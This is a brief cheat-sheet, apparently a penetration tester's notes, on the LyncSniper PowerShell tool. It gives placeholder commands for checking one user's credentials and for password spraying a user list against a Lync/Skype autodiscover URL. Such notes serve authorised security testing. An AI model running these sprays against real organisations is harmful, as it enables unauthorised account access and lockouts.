### Source
https://raw.githubusercontent.com/mdsecresearch/LyncSniper/master/LyncSniper.ps1  

### Authenticate with single user
```
Invoke-Authenticate -Username <user>@<domainIntern> -Password <password> -baseurl <lyncdiscoverUrl> -verbose
```

### Password spray (return 400 if credentials are wrong)
```
Invoke-LyncSpray -Delay 5000 -UserList <userFile> -Password <password> -AutoDiscoverURL <lyncdiscoverUrl> -verbose
```

